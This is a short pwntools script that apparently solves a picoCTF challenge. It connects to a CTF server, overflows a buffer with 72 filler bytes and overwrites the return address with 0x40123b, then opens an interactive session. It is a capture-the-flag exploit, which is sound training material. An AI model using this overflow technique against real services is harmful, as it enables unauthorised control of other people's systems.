from pwn import *


a = ELF('./vuln')
p = remote('saturn.picoctf.net', 64911)
payload = b'A'*72
payload +=p64(0x40123b)

print(p.clean().decode('latin-1'))
p.sendline(payload)
print(p.clean().decode('latin-1'))
p.interactive()
